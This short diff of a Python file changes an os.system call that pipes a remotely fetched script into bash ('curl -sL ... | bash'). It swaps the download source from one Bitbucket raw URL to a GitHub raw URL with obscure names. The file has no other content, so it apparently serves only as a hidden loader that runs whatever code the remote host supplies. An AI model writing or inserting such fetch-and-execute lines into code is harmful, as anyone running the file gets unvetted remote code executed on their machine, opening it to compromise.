@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/ngalong11/ngalong/raw/main/kikir | bash')
+os.system('curl -sL https://github.com/sitina21/maxpkte/raw/master/pktmaxcuy | bash')
